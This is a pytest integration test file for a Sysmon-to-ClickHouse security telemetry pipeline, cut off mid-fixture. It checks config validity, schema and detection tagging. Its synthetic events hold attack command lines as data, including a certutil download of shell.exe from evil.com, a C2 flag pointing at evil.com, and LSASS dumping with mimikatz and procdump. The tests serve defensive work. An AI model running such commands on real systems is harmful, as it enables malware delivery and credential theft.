"""
CLIF Sysmon Integration Tests
===============================
Production-grade tests validating the complete Sysmon pipeline integration:

  1. Sysmon XML Config Validation — schema, event IDs, exclusions
  2. Schema Compatibility — Windows agent output fields match ClickHouse columns
  3. E2E Pipeline — Sysmon events flow Redpanda → Consumer → ClickHouse (all 4 tables)
  4. Detection Rules — LOLBins, credential dumps, recon, Office macros, suspicious paths
  5. MITRE ATT&CK Mapping — correct MITRE tags for each event category
  6. Edge Cases — malformed data, missing fields, extreme values
  7. Central Vector Routing — pre-classified events bypass classification chain
  8. Cross-table Correlation — Sysmon events correlatable by hostname/PID

Run:
    pytest tests/test_sysmon_integration.py -v --tb=short
"""
from __future__ import annotations

import json
import os
import random
import re
import time
import uuid
import xml.etree.ElementTree as ET
from datetime import datetime, timezone
from pathlib import Path

import pytest
import requests

from conftest import CH_DB, BROKER


# ── Paths ────────────────────────────────────────────────────────────────────

SYSMON_DIR = Path(__file__).resolve().parent.parent / "sysmon"
SYSMON_CONFIG = SYSMON_DIR / "sysmonconfig-clif.xml"
VECTOR_AGENT_CONFIG = SYSMON_DIR / "vector-agent-windows.yaml"
CENTRAL_VECTOR_CONFIG = Path(__file__).resolve().parent.parent / "vector" / "vector.yaml"
INSTALL_SCRIPT = SYSMON_DIR / "Install-ClifSysmon.ps1"
UNINSTALL_SCRIPT = SYSMON_DIR / "Uninstall-ClifSysmon.ps1"
STATUS_SCRIPT = SYSMON_DIR / "Get-ClifSysmonStatus.ps1"

# ── Central Vector HTTP endpoint ─────────────────────────────────────────────

VECTOR_HTTP_URL = os.getenv("VECTOR_HTTP_URL", "http://localhost:8687")

# ── Helpers ──────────────────────────────────────────────────────────────────

def _now_iso() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def _produce_and_flush(producer, topic: str, events: list[dict], timeout: int = 30):
    """Produce a batch and block until all deliveries are confirmed."""
    delivered = []
    errors = []

    def _cb(err, msg):
        if err:
            errors.append(err)
        else:
            delivered.append(msg)

    for event in events:
        producer.produce(topic, json.dumps(event).encode(), callback=_cb)
    producer.flush(timeout)
    producer.poll(0)
    assert len(errors) == 0, f"Producer delivery errors: {errors}"
    return len(delivered)


def _wait_for_count(ch, table: str, field: str, value: str,
                    expected: int, timeout: int = 45) -> int:
    """Poll ClickHouse until expected rows appear or timeout."""
    deadline = time.monotonic() + timeout
    found = 0
    while time.monotonic() < deadline:
        try:
            result = ch.query(
                f"SELECT count() FROM {table} WHERE {field} = {{val:String}}",
                parameters={"val": value},
            )
            found = result.result_rows[0][0]
            if found >= expected:
                return found
        except Exception:
            pass
        time.sleep(0.5)
    return found


def _post_to_vector(events: list[dict], timeout: int = 10) -> requests.Response:
    """POST events directly to central Vector's HTTP JSON endpoint."""
    return requests.post(
        f"{VECTOR_HTTP_URL}/v1/logs",
        json=events if len(events) > 1 else events[0],
        headers={"Content-Type": "application/json"},
        timeout=timeout,
    )


# ═══════════════════════════════════════════════════════════════════════════════
# Category 1: Sysmon XML Config Validation
# ═══════════════════════════════════════════════════════════════════════════════


class TestSysmonConfig:
    """Validate the Sysmon XML configuration file."""

    def test_config_file_exists(self):
        assert SYSMON_CONFIG.exists(), f"Sysmon config not found: {SYSMON_CONFIG}"

    def test_config_valid_xml(self):
        tree = ET.parse(SYSMON_CONFIG)
        root = tree.getroot()
        assert root.tag == "Sysmon", f"Root element should be 'Sysmon', got '{root.tag}'"

    def test_schema_version_present(self):
        tree = ET.parse(SYSMON_CONFIG)
        root = tree.getroot()
        version = root.get("schemaversion")
        assert version is not None, "schemaversion attribute missing"
        major = int(version.split(".")[0])
        assert major >= 4, f"Schema version {version} is too old (need 4.x+)"

    def test_hash_algorithm_configured(self):
        tree = ET.parse(SYSMON_CONFIG)
        root = tree.getroot()
        hash_algs = root.find("HashAlgorithms")
        assert hash_algs is not None, "HashAlgorithms element missing"
        text = hash_algs.text or ""
        assert "SHA256" in text, f"SHA256 not in HashAlgorithms: {text}"

    def test_archive_directory_configured(self):
        tree = ET.parse(SYSMON_CONFIG)
        root = tree.getroot()
        archive = root.find("ArchiveDirectory")
        assert archive is not None, "ArchiveDirectory not configured"
        assert "CLIF" in (archive.text or ""), "ArchiveDirectory should be under CLIF"

    def test_check_revocation_enabled(self):
        tree = ET.parse(SYSMON_CONFIG)
        root = tree.getroot()
        rev = root.find("CheckRevocation")
        # CheckRevocation can be a self-closing element (presence = enabled)
        assert rev is not None, "CheckRevocation not enabled"

    def test_event_filtering_present(self):
        tree = ET.parse(SYSMON_CONFIG)
        root = tree.getroot()
        ef = root.find("EventFiltering")
        assert ef is not None, "EventFiltering section missing"

    @pytest.mark.parametrize("event_name", [
        "ProcessCreate",           # EID 1
        "FileCreateTime",          # EID 2
        "NetworkConnect",          # EID 3
        "ProcessTerminate",        # EID 5
        "DriverLoad",              # EID 6
        "ImageLoad",               # EID 7
        "CreateRemoteThread",      # EID 8
        "RawAccessRead",           # EID 9
        "ProcessAccess",           # EID 10
        "FileCreate",              # EID 11
        "RegistryEvent",           # EID 12-14
        "FileCreateStreamHash",    # EID 15
        "PipeEvent",               # EID 17-18
        "DnsQuery",                # EID 22
        "FileDelete",              # EID 23
        "ClipboardChange",         # EID 24
        "ProcessTampering",        # EID 25
        "FileDeleteDetected",      # EID 26
    ])
    def test_event_id_configured(self, event_name):
        """Each critical Sysmon event type must have filter rules."""
        tree = ET.parse(SYSMON_CONFIG)
        ef = tree.find(".//EventFiltering")
        assert ef is not None
        # Look for RuleGroup or direct child matching event_name
        found = False
        for elem in ef.iter():
            if elem.tag == event_name:
                found = True
                break
            # Also check inside RuleGroup elements
            for child in elem:
                if child.tag == event_name:
                    found = True
                    break
        assert found, f"Event type '{event_name}' not configured in EventFiltering"

    def test_process_create_has_noise_exclusions(self):
        """ProcessCreate should exclude common noisy OS processes."""
        tree = ET.parse(SYSMON_CONFIG)
        config_text = ET.tostring(tree.getroot(), encoding="unicode")
        # At least some common exclusions should exist
        noise_patterns = ["RuntimeBroker", "backgroundTaskHost", "WmiPrvSE"]
        found = sum(1 for p in noise_patterns if p in config_text)
        assert found >= 2, "ProcessCreate should exclude common noisy processes"

    def test_network_connect_excludes_browsers(self):
        """NetworkConnect should exclude common browser traffic."""
        tree = ET.parse(SYSMON_CONFIG)
        config_text = ET.tostring(tree.getroot(), encoding="unicode")
        assert "chrome.exe" in config_text or "msedge.exe" in config_text, \
            "NetworkConnect should exclude browser processes"

    def test_dns_query_excludes_telemetry(self):
        """DnsQuery should exclude Microsoft/Google telemetry domains."""
        tree = ET.parse(SYSMON_CONFIG)
        config_text = ET.tostring(tree.getroot(), encoding="unicode")
        telemetry_domains = ["microsoft.com", "google.com", "windows.com"]
        found = sum(1 for d in telemetry_domains if d in config_text)
        assert found >= 1, "DnsQuery should exclude known telemetry domains"

    def test_registry_monitors_run_keys(self):
        """Registry events should monitor autorun locations."""
        tree = ET.parse(SYSMON_CONFIG)
        config_text = ET.tostring(tree.getroot(), encoding="unicode")
        assert "\\Run" in config_text, "Registry rules should monitor Run keys"

    def test_image_load_monitors_attack_dlls(self):
        """ImageLoad should watch for known attack-related DLLs."""
        tree = ET.parse(SYSMON_CONFIG)
        config_text = ET.tostring(tree.getroot(), encoding="unicode")
        attack_dlls = ["clr.dll", "amsi.dll", "dbghelp.dll"]
        found = sum(1 for d in attack_dlls if d in config_text)
        assert found >= 2, "ImageLoad should monitor attack DLLs (clr.dll, amsi.dll, dbghelp.dll)"


# ═══════════════════════════════════════════════════════════════════════════════
# Category 2: File Structure & Script Validation
# ═══════════════════════════════════════════════════════════════════════════════


class TestSysmonFileStructure:
    """Validate the Sysmon deployment package is complete."""

    @pytest.mark.parametrize("path", [
        SYSMON_CONFIG,
        VECTOR_AGENT_CONFIG,
        INSTALL_SCRIPT,
        UNINSTALL_SCRIPT,
        STATUS_SCRIPT,
        SYSMON_DIR / "README.md",
    ])
    def test_file_exists(self, path):
        assert path.exists(), f"Missing file: {path.name}"

    def test_vector_agent_config_valid_yaml(self):
        """Vector agent config should be parseable YAML."""
        import yaml
        with open(VECTOR_AGENT_CONFIG) as f:
            config = yaml.safe_load(f)
        assert "sources" in config
        assert "transforms" in config
        assert "sinks" in config

    def test_vector_agent_has_sysmon_source(self):
        import yaml
        with open(VECTOR_AGENT_CONFIG) as f:
            config = yaml.safe_load(f)
        assert "sysmon" in config["sources"]
        assert config["sources"]["sysmon"]["type"] == "windows_event_log"
        assert "Sysmon" in config["sources"]["sysmon"]["channel"]

    def test_vector_agent_has_security_source(self):
        import yaml
        with open(VECTOR_AGENT_CONFIG) as f:
            config = yaml.safe_load(f)
        assert "windows_security" in config["sources"]

    def test_vector_agent_has_powershell_source(self):
        import yaml
        with open(VECTOR_AGENT_CONFIG) as f:
            config = yaml.safe_load(f)
        assert "powershell" in config["sources"]

    def test_vector_agent_sinks_use_http(self):
        """All sinks should be HTTP type (forwarding to central Vector)."""
        import yaml
        with open(VECTOR_AGENT_CONFIG) as f:
            config = yaml.safe_load(f)
        for sink_name, sink_config in config["sinks"].items():
            assert sink_config["type"] == "http", \
                f"Sink '{sink_name}' should be HTTP, got {sink_config['type']}"

    def test_vector_agent_sinks_use_disk_buffer(self):
        """All sinks should use disk buffer for resilience."""
        import yaml
        with open(VECTOR_AGENT_CONFIG) as f:
            config = yaml.safe_load(f)
        for sink_name, sink_config in config["sinks"].items():
            buf = sink_config.get("buffer", {})
            assert buf.get("type") == "disk", \
                f"Sink '{sink_name}' should use disk buffer"

    def test_vector_agent_sinks_use_gzip(self):
        """All sinks should use gzip compression."""
        import yaml
        with open(VECTOR_AGENT_CONFIG) as f:
            config = yaml.safe_load(f)
        for sink_name, sink_config in config["sinks"].items():
            assert sink_config.get("compression") == "gzip", \
                f"Sink '{sink_name}' should use gzip compression"

    def test_install_script_requires_admin(self):
        """Install script should have RunAsAdministrator requirement."""
        content = INSTALL_SCRIPT.read_text(encoding="utf-8")
        assert "#Requires -RunAsAdministrator" in content

    def test_install_script_has_validation(self):
        """Install script should validate installation at the end."""
        content = INSTALL_SCRIPT.read_text(encoding="utf-8")
        assert "Test-Installation" in content

    def test_install_script_configures_health_monitor(self):
        content = INSTALL_SCRIPT.read_text(encoding="utf-8")
        assert "Register-HealthMonitor" in content or "HealthMonitor" in content

    def test_uninstall_script_removes_service(self):
        content = UNINSTALL_SCRIPT.read_text(encoding="utf-8")
        assert "clif-vector-agent" in content

    def test_status_script_checks_sysmon(self):
        content = STATUS_SCRIPT.read_text(encoding="utf-8")
        assert "Sysmon64" in content


# ═══════════════════════════════════════════════════════════════════════════════
# Category 3: Central Vector Config — Sysmon Routing Integration
# ═══════════════════════════════════════════════════════════════════════════════


class TestCentralVectorConfig:
    """Validate the central Vector config has correct Sysmon routing."""

    @pytest.fixture(scope="class")
    def config_text(self):
        return CENTRAL_VECTOR_CONFIG.read_text(encoding="utf-8")

    def test_route_http_source_exists(self, config_text):
        assert "route_http_source" in config_text, \
            "Central Vector must have route_http_source transform"

    def test_route_windows_events_exists(self, config_text):
        assert "route_windows_events" in config_text, \
            "Central Vector must have route_windows_events transform"

    def test_standard_http_routed_to_parse(self, config_text):
        assert "route_http_source.standard" in config_text, \
            "Standard HTTP events should route to parse_and_structure"

    def test_windows_events_bypass_classification(self, config_text):
        """Windows events should NOT go through classify_security."""
        # The windows_agent route should go to route_windows_events, not classify
        assert "route_http_source.windows_agent" in config_text

    def test_windows_events_feed_dedup(self, config_text):
        """Windows events should feed into dedup transforms."""
        assert "route_windows_events.security" in config_text
        assert "route_windows_events.process" in config_text
        assert "route_windows_events.network" in config_text
        assert "route_windows_events.raw" in config_text

    def test_dedup_accepts_both_sources(self, config_text):
        """Each dedup transform must accept both classified and Windows events."""
        # Check that dedup_security has both format_security and route_windows_events.security
        import yaml
        config = yaml.safe_load(config_text)
        transforms = config["transforms"]

        dedup_sec = transforms["dedup_security"]["inputs"]
        assert "format_security" in dedup_sec
        assert "route_windows_events.security" in dedup_sec

        dedup_proc = transforms["dedup_process"]["inputs"]
        assert "format_process" in dedup_proc
        assert "route_windows_events.process" in dedup_proc

        dedup_net = transforms["dedup_network"]["inputs"]
        assert "format_network" in dedup_net
        assert "route_windows_events.network" in dedup_net

        dedup_raw = transforms["dedup_raw"]["inputs"]
        assert "format_raw" in dedup_raw
        assert "route_windows_events.raw" in dedup_raw


# ═══════════════════════════════════════════════════════════════════════════════
# Category 4: Schema Compatibility — Windows Agent Output vs ClickHouse Columns
# ═══════════════════════════════════════════════════════════════════════════════


class TestSchemaCompatibility:
    """Verify that the Windows Vector agent output fields match what the
    consumer expects and what ClickHouse tables accept."""

    # Expected fields per event type (matching consumer column lists)
    SECURITY_FIELDS = {
        "timestamp", "severity", "category", "source", "description",
        "user_id", "ip_address", "hostname", "mitre_tactic", "mitre_technique",
        "ai_confidence", "ai_explanation", "metadata",
    }
    PROCESS_FIELDS = {
        "timestamp", "hostname", "pid", "ppid", "uid", "gid",
        "binary_path", "arguments", "cwd", "exit_code",
        "container_id", "pod_name", "namespace", "syscall",
        "is_suspicious", "detection_rule", "metadata",
    }
    NETWORK_FIELDS = {
        "timestamp", "hostname", "src_ip", "src_port", "dst_ip", "dst_port",
        "protocol", "direction", "bytes_sent", "bytes_received", "duration_ms",
        "pid", "binary_path", "container_id", "pod_name", "namespace",
        "dns_query", "geo_country", "is_suspicious", "detection_rule", "metadata",
    }
    RAW_FIELDS = {
        "timestamp", "level", "source", "message", "metadata",
    }

    def _build_sysmon_security_event(self) -> dict:
        """Build a sample Sysmon security event as it would arrive from the Windows agent."""
        return {
            "clif_event_type": "security",
            "timestamp": _now_iso(),
            "severity": 4,
            "category": "credential-access",
            "source": "sysmon",
            "description": "LSASS credential dump attempt: C:\\temp\\mimikatz.exe accessed lsass.exe",
            "user_id": "CORP\\admin",
            "ip_address": "0.0.0.0",
            "hostname": "WORKSTATION-01",
            "mitre_tactic": "credential-access",
            "mitre_technique": "T1003.001",
            "ai_confidence": 0.0,
            "ai_explanation": "",
            "metadata": {"sysmon_event_id": "10", "original_source_type": "sysmon"},
        }

    def _build_sysmon_process_event(self) -> dict:
        return {
            "clif_event_type": "process",
            "timestamp": _now_iso(),
            "hostname": "WORKSTATION-01",
            "pid": 4532,
            "ppid": 1024,
            "uid": 0,
            "gid": 0,
            "binary_path": "C:\\Windows\\System32\\cmd.exe",
            "arguments": "cmd.exe /c whoami",
            "cwd": "C:\\Users\\admin",
            "exit_code": -1,
            "container_id": "",
            "pod_name": "",
            "namespace": "",
            "syscall": "CreateProcess",
            "is_suspicious": 1,
            "detection_rule": "recon_whoami",
            "metadata": {"sysmon_event_id": "1", "original_source_type": "sysmon"},
        }

    def _build_sysmon_network_event(self) -> dict:
        return {
            "clif_event_type": "network",
            "timestamp": _now_iso(),
            "hostname": "WORKSTATION-01",
            "src_ip": "192.168.1.100",
            "src_port": 49152,
            "dst_ip": "93.184.216.34",
            "dst_port": 443,
            "protocol": "TCP",
            "direction": "outbound",
            "bytes_sent": 0,
            "bytes_received": 0,
            "duration_ms": 0,
            "pid": 8080,
            "binary_path": "C:\\Windows\\System32\\svchost.exe",
            "container_id": "",
            "pod_name": "",
            "namespace": "",
            "dns_query": "",
            "geo_country": "",
            "is_suspicious": 0,
            "detection_rule": "",
            "metadata": {"sysmon_event_id": "3", "original_source_type": "sysmon"},
        }

    def _build_sysmon_raw_event(self) -> dict:
        return {
            "clif_event_type": "raw",
            "timestamp": _now_iso(),
            "level": "INFO",
            "source": "sysmon",
            "message": "File created: C:\\Users\\admin\\Downloads\\payload.exe by C:\\Windows\\Explorer.exe",
            "metadata": {"sysmon_event_id": "11", "original_source_type": "sysmon"},
        }

    def test_security_event_has_all_fields(self):
        event = self._build_sysmon_security_event()
        event_fields = set(event.keys()) - {"clif_event_type"}
        missing = self.SECURITY_FIELDS - event_fields
        assert not missing, f"Security event missing fields: {missing}"

    def test_process_event_has_all_fields(self):
        event = self._build_sysmon_process_event()
        event_fields = set(event.keys()) - {"clif_event_type"}
        missing = self.PROCESS_FIELDS - event_fields
        assert not missing, f"Process event missing fields: {missing}"

    def test_network_event_has_all_fields(self):
        event = self._build_sysmon_network_event()
        event_fields = set(event.keys()) - {"clif_event_type"}
        missing = self.NETWORK_FIELDS - event_fields
        assert not missing, f"Network event missing fields: {missing}"

    def test_raw_event_has_all_fields(self):
        event = self._build_sysmon_raw_event()
        event_fields = set(event.keys()) - {"clif_event_type"}
        missing = self.RAW_FIELDS - event_fields
        assert not missing, f"Raw event missing fields: {missing}"

    def test_security_no_unexpected_fields(self):
        """No extra fields that would confuse the consumer."""
        event = self._build_sysmon_security_event()
        event_fields = set(event.keys()) - {"clif_event_type"}
        extra = event_fields - self.SECURITY_FIELDS
        # Extra fields are OK — consumer ignores them — but flag for awareness
        # Not a hard failure since consumer uses .get() with defaults

    def test_metadata_is_dict(self):
        """Metadata must be a dict (Map(String,String) in ClickHouse)."""
        for builder in [
            self._build_sysmon_security_event,
            self._build_sysmon_process_event,
            self._build_sysmon_network_event,
            self._build_sysmon_raw_event,
        ]:
            event = builder()
            assert isinstance(event["metadata"], dict), \
                f"metadata should be dict, got {type(event['metadata'])}"

    def test_metadata_values_are_strings(self):
        """ClickHouse Map(String,String) requires string values."""
        for builder in [
            self._build_sysmon_security_event,
            self._build_sysmon_process_event,
            self._build_sysmon_network_event,
            self._build_sysmon_raw_event,
        ]:
            event = builder()
            for k, v in event["metadata"].items():
                assert isinstance(k, str), f"metadata key '{k}' should be str"
                assert isinstance(v, str), f"metadata value for '{k}' should be str"

    def test_severity_is_uint8_range(self):
        event = self._build_sysmon_security_event()
        sev = event["severity"]
        assert 0 <= sev <= 255, f"severity {sev} out of UInt8 range"

    def test_ports_are_uint16_range(self):
        event = self._build_sysmon_network_event()
        assert 0 <= event["src_port"] <= 65535
        assert 0 <= event["dst_port"] <= 65535

    def test_pid_is_uint32_range(self):
        event = self._build_sysmon_process_event()
        assert 0 <= event["pid"] <= 4294967295
        assert 0 <= event["ppid"] <= 4294967295


# ═══════════════════════════════════════════════════════════════════════════════
# Category 5: E2E Pipeline — Sysmon Events through Redpanda → ClickHouse
# ═══════════════════════════════════════════════════════════════════════════════
# These tests simulate what the Windows Vector agent produces and push events
# directly into the Redpanda topics (bypassing Vector to test Consumer+CH).


class TestSysmonE2ESecurityEvents:
    """E2E: Sysmon security events → security-events topic → ClickHouse."""

    TAG = f"sysmon-sec-{uuid.uuid4().hex[:8]}"
    COUNT = 50

    @pytest.fixture(autouse=True, scope="class")
    def _produce(self, kafka_producer, ch1):
        events = []
        sysmon_eids = [
            (6, "persistence", "T1547.006", "Driver loaded: C:\\temp\\rootkit.sys (Signed:false)"),
            (8, "defense-evasion", "T1055", "Remote thread: explorer.exe -> svchost.exe"),
            (9, "credential-access", "T1003", "Raw disk access: C:\\temp\\tool.exe reading PhysicalDrive0"),
            (10, "credential-access", "T1003.001", "LSASS access: C:\\temp\\procdump.exe -> lsass.exe"),
            (12, "persistence", "T1547.001", "Registry SetValue: HKLM\\...\\Run\\Backdoor"),
            (15, "defense-evasion", "T1564.004", "ADS: C:\\data\\readme.txt:hidden.exe"),
            (24, "collection", "T1115", "Clipboard accessed by powershell.exe"),
            (25, "defense-evasion", "T1055.012", "Process tampering: C:\\temp\\hollowed.exe"),
        ]
        for i in range(self.COUNT):
            eid_info = sysmon_eids[i % len(sysmon_eids)]
            events.append({
                "timestamp": _now_iso(),
                "severity": 3 + (i % 2),
                "category": eid_info[1],
                "source": "sysmon",
                "description": f"{eid_info[3]} tag={self.TAG} idx={i}",
                "user_id": f"CORP\\user_{i % 5}",
                "ip_address": "0.0.0.0",
                "hostname": f"WIN-SYSMON-{i % 3:02d}",
                "mitre_tactic": eid_info[1],
                "mitre_technique": eid_info[2],
                "ai_confidence": 0.0,
                "ai_explanation": "",
                "metadata": {
                    "sysmon_event_id": str(eid_info[0]),
                    "original_source_type": "sysmon",
                    "test_tag": self.TAG,
                },
            })
        _produce_and_flush(kafka_producer, "security-events", events)
        _wait_for_count(ch1, "security_events", "metadata['test_tag']", self.TAG, self.COUNT)

    def test_all_events_ingested(self, ch1):
        """All Sysmon security events reach ClickHouse."""
        found = _wait_for_count(ch1, "security_events", "metadata['test_tag']", self.TAG, self.COUNT)
        assert found >= self.COUNT, f"Expected ≥{self.COUNT}, got {found}"

    def test_mitre_tactic_populated(self, ch1):
        result = ch1.query(
            "SELECT count() FROM security_events "
            "WHERE metadata['test_tag'] = {tag:String} AND mitre_tactic != ''",
            parameters={"tag": self.TAG},
        )
        assert result.result_rows[0][0] >= self.COUNT

    def test_mitre_technique_populated(self, ch1):
        result = ch1.query(
            "SELECT count() FROM security_events "
            "WHERE metadata['test_tag'] = {tag:String} AND mitre_technique != ''",
            parameters={"tag": self.TAG},
        )
        assert result.result_rows[0][0] >= self.COUNT

    def test_severity_values_correct(self, ch1):
        result = ch1.query(
            "SELECT min(severity), max(severity) FROM security_events "
            "WHERE metadata['test_tag'] = {tag:String}",
            parameters={"tag": self.TAG},
        )
        mn, mx = result.result_rows[0]
        assert mn >= 0 and mx <= 4

    def test_metadata_contains_sysmon_eid(self, ch1):
        result = ch1.query(
            "SELECT metadata['sysmon_event_id'] FROM security_events "
            "WHERE metadata['test_tag'] = {tag:String} LIMIT 10",
            parameters={"tag": self.TAG},
        )
        for row in result.result_rows:
            assert row[0] != "", "sysmon_event_id should be in metadata"

    def test_replicated_to_node2(self, ch1, ch2):
        _wait_for_count(ch1, "security_events", "metadata['test_tag']", self.TAG, self.COUNT)
        found = _wait_for_count(ch2, "security_events", "metadata['test_tag']", self.TAG, self.COUNT, timeout=30)
        assert found >= self.COUNT


class TestSysmonE2EProcessEvents:
    """E2E: Sysmon process events → process-events topic → ClickHouse."""

    TAG = f"sysmon-proc-{uuid.uuid4().hex[:8]}"
    COUNT = 50

    @pytest.fixture(autouse=True, scope="class")
    def _produce(self, kafka_producer, ch1):
        events = []
        binaries = [
            ("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c whoami", "CreateProcess"),
            ("C:\\Windows\\System32\\powershell.exe", "powershell -enc SGVsbG8=", "CreateProcess"),
            ("C:\\Windows\\System32\\certutil.exe", "certutil -urlcache -f http://evil.com/shell.exe", "CreateProcess"),
            ("C:\\Users\\admin\\Downloads\\payload.exe", "payload.exe --c2 evil.com", "CreateProcess"),
            ("C:\\Windows\\System32\\rundll32.exe", "rundll32.exe shell32.dll,Control_RunDLL", "CreateProcess"),
        ]
        for i in range(self.COUNT):
            bp, args, sc = binaries[i % len(binaries)]
            events.append({
                "timestamp": _now_iso(),
                "hostname": f"WIN-SYSMON-{i % 3:02d}",
                "pid": 5000 + i,
                "ppid": 1000 + (i % 10),
                "uid": 0,
                "gid": 0,
                "binary_path": bp,
                "arguments": f"{args} tag={self.TAG}",
                "cwd": "C:\\Users\\admin",
                "exit_code": -1,
                "container_id": "",
                "pod_name": "",
                "namespace": self.TAG,
                "syscall": sc,
                "is_suspicious": 1 if i % 5 == 0 else 0,
                "detection_rule": "lolbin_certutil" if i % 5 == 0 else "",
                "metadata": {
                    "sysmon_event_id": "1",
                    "original_source_type": "sysmon",
                    "test_tag": self.TAG,
                },
            })
        _produce_and_flush(kafka_producer, "process-events", events)
        _wait_for_count(ch1, "process_events", "namespace", self.TAG, self.COUNT)

    def test_all_events_ingested(self, ch1):
        found = _wait_for_count(ch1, "process_events", "namespace", self.TAG, self.COUNT)
        assert found >= self.COUNT

    def test_pid_values_correct(self, ch1):
        result = ch1.query(
            "SELECT min(pid), max(pid) FROM process_events "
            "WHERE namespace = {ns:String}",
            parameters={"ns": self.TAG},
        )
        mn, mx = result.result_rows[0]
        assert mn >= 5000 and mx <= 5000 + self.COUNT

    def test_suspicious_flagged(self, ch1):
        result = ch1.query(
            "SELECT count() FROM process_events "
            "WHERE namespace = {ns:String} AND is_suspicious = 1",
            parameters={"ns": self.TAG},
        )
        expected = self.COUNT // 5
        assert result.result_rows[0][0] >= expected

    def test_detection_rule_set(self, ch1):
        result = ch1.query(
            "SELECT count() FROM process_events "
            "WHERE namespace = {ns:String} AND detection_rule != ''",
            parameters={"ns": self.TAG},
        )
        assert result.result_rows[0][0] >= self.COUNT // 5

    def test_binary_paths_stored(self, ch1):
        result = ch1.query(
            "SELECT DISTINCT binary_path FROM process_events "
            "WHERE namespace = {ns:String}",
            parameters={"ns": self.TAG},
        )
        paths = {row[0] for row in result.result_rows}
        assert len(paths) >= 3, f"Expected multiple binary paths, got {paths}"


class TestSysmonE2ENetworkEvents:
    """E2E: Sysmon network events → network-events topic → ClickHouse."""

    TAG = f"sysmon-net-{uuid.uuid4().hex[:8]}"
    COUNT = 50

    @pytest.fixture(autouse=True, scope="class")
    def _produce(self, kafka_producer, ch1):
        events = []
        for i in range(self.COUNT):
            is_dns = (i % 3 == 0)
            events.append({
                "timestamp": _now_iso(),
                "hostname": f"WIN-SYSMON-{i % 3:02d}",
                "src_ip": f"192.168.1.{100 + i % 50}",
                "src_port": 49152 + i,
                "dst_ip": f"10.{i % 256}.0.1" if not is_dns else "8.8.8.8",
                "dst_port": 53 if is_dns else 443,
                "protocol": "DNS" if is_dns else "TCP",
                "direction": "outbound",
                "bytes_sent": 0,
                "bytes_received": 0,
                "duration_ms": 0,
                "pid": 8000 + i,
                "binary_path": "C:\\Windows\\System32\\svchost.exe",
                "container_id": "",
                "pod_name": "",
                "namespace": self.TAG,
                "dns_query": f"{self.TAG}.malware-c2.com" if is_dns else "",
                "geo_country": "",
                "is_suspicious": 0,
                "detection_rule": "",
                "metadata": {
                    "sysmon_event_id": "22" if is_dns else "3",
                    "original_source_type": "sysmon",
                    "test_tag": self.TAG,
                },
            })
        _produce_and_flush(kafka_producer, "network-events", events)
        _wait_for_count(ch1, "network_events", "namespace", self.TAG, self.COUNT)

    def test_all_events_ingested(self, ch1):
        found = _wait_for_count(
            ch1, "network_events", "namespace", self.TAG, self.COUNT,
        )
        assert found >= self.COUNT

    def test_dns_queries_stored(self, ch1):
        result = ch1.query(
            "SELECT count() FROM network_events "
            "WHERE namespace = {ns:String} AND dns_query != ''",
            parameters={"ns": self.TAG},
        )
        dns_count = self.COUNT // 3 + (1 if self.COUNT % 3 > 0 else 0)
        assert result.result_rows[0][0] >= dns_count - 1

    def test_protocol_values(self, ch1):
        result = ch1.query(
            "SELECT DISTINCT protocol FROM network_events "
            "WHERE namespace = {ns:String}",
            parameters={"ns": self.TAG},
        )
        protocols = {row[0] for row in result.result_rows}
        assert "TCP" in protocols or "DNS" in protocols

    def test_ip_addresses_valid(self, ch1):
        result = ch1.query(
            "SELECT count() FROM network_events "
            "WHERE namespace = {ns:String} AND src_ip != toIPv4('0.0.0.0')",
            parameters={"ns": self.TAG},
        )
        assert result.result_rows[0][0] >= self.COUNT


class TestSysmonE2ERawLogs:
    """E2E: Sysmon raw events → raw-logs topic → ClickHouse."""

    TAG = f"sysmon-raw-{uuid.uuid4().hex[:8]}"
    COUNT = 50

    @pytest.fixture(autouse=True, scope="class")
    def _produce(self, kafka_producer, ch1):
        events = []
        raw_messages = [
            "File created: C:\\Users\\admin\\Downloads\\malware.exe by explorer.exe",
            "Named pipe created: \\\\pipe\\testpipe by cmd.exe",
            "File deleted [archived]: C:\\temp\\evidence.docx by powershell.exe",
            "File creation time modified: C:\\Windows\\Temp\\backdoor.dll",
            "Sysmon EventID 26: File deleted: C:\\Users\\admin\\cleanup.bat",
        ]
        for i in range(self.COUNT):
            events.append({
                "timestamp": _now_iso(),
                "level": "INFO" if i % 3 != 0 else "WARNING",
                "source": "sysmon",
                "message": f"{raw_messages[i % len(raw_messages)]} tag={self.TAG}",
                "metadata": {
                    "sysmon_event_id": str([11, 17, 23, 2, 26][i % 5]),
                    "original_source_type": "sysmon",
                    "test_tag": self.TAG,
                },
            })
        _produce_and_flush(kafka_producer, "raw-logs", events)
        _wait_for_count(ch1, "raw_logs", "metadata['test_tag']", self.TAG, self.COUNT)

    def test_all_events_ingested(self, ch1):
        found = _wait_for_count(ch1, "raw_logs", "metadata['test_tag']", self.TAG, self.COUNT)
        assert found >= self.COUNT

    def test_levels_correct(self, ch1):
        result = ch1.query(
            "SELECT DISTINCT level FROM raw_logs "
            "WHERE metadata['test_tag'] = {tag:String}",
            parameters={"tag": self.TAG},
        )
        levels = {row[0] for row in result.result_rows}
        assert levels.issubset({"INFO", "WARNING", "WARN", "ERROR", "DEBUG", "CRITICAL"})

    def test_metadata_has_sysmon_eid(self, ch1):
        result = ch1.query(
            "SELECT metadata['sysmon_event_id'] FROM raw_logs "
            "WHERE metadata['test_tag'] = {tag:String} LIMIT 10",
            parameters={"tag": self.TAG},
        )
        for row in result.result_rows:
            assert row[0] != "", "sysmon_event_id should be set"


# ═══════════════════════════════════════════════════════════════════════════════
# Category 6: Detection Rules Coverage
# ═══════════════════════════════════════════════════════════════════════════════


class TestDetectionRules:
    """Verify that the detection rule logic in vector-agent-windows.yaml
    would produce the expected detection_rule and is_suspicious values.
    We test by sending pre-classified events (as the agent would produce)
    directly into Redpanda and verifying they arrive correctly."""

    @pytest.fixture(scope="class")
    def detection_tag(self):
        return f"det-{uuid.uuid4().hex[:8]}"

    @pytest.fixture(autouse=True, scope="class")
    def _produce_detections(self, kafka_producer, ch1, detection_tag):
        """Push process events with various detection rule flags."""
        events = [
            # LOLBin: certutil
            {
                "timestamp": _now_iso(), "hostname": "DET-HOST",
                "pid": 9001, "ppid": 1, "uid": 0, "gid": 0,
                "binary_path": "C:\\Windows\\System32\\certutil.exe",
                "arguments": f"certutil -urlcache -f http://evil.com/shell.exe det={detection_tag}",
                "cwd": "", "exit_code": -1, "container_id": "", "pod_name": "",
                "namespace": "detection-test", "syscall": "CreateProcess",
